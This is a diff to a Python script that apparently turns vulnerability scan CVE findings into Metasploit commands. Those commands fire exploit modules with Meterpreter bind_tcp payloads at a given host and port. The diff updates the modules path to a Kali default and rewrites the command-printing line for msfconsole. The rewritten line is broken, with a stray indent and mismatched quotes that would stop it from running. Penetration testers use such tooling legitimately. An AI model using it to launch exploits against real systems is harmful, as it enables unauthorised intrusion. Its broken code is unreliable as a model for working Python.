@@ -16,12 +16,6 @@ import string
 #							#
 #########################################################
 
-# Changelog
-# 0.1 alpha - written from scratch 100% change
-# 0.1 beta
-#  fixed duplicate cve findings for different OS's
-#  added colors and debug code
-
 
 ####  usage #####################################
 #						#
@@ -29,10 +23,11 @@ import string
 #						#
 #################################################
 
-# You need to update this line with your trunk folder - e.g. /opt/metasploit/apps/pro/msf3/modules/exploits/
+# You need to update this line with your trunk folder - e.g./usr/share/metasploit-framework/modules/exploits/ 
+# Note the current is the default in Kali Linux 2017.2
 # it must end in a /
 #trunk = "UPDATEME"
-trunk = "/opt/metasploit/apps/pro/msf3/modules/exploits/"
+trunk = "/usr/share/metasploit-framework/modules/exploits/"
 winpayload = "windows/meterpreter/bind_tcp"
 linuxpayload = "linux/x86/meterpreter/bind_tcp"
 javapayload = "java/meterpreter/bind_tcp"
@@ -141,7 +136,7 @@ def printme(port,host,exploit,cve,os,rank,title):
 	else:
 		#some payloads we have yet to work out so for now its TODO :(
 		payload = "TODO"
-	print "msfcli exploit/"+exploit,"PAYLOAD="+payload, "RPORT="+port, "RHOST="+host," E"	
+	 print "msfconsole -x 'use exploit/"+exploit; set "PAYLOAD="+payload; set "RPORT="+port; set "RHOST="+host; run'" 	
 	print ""
 
 def checkcve(cve,port,host):
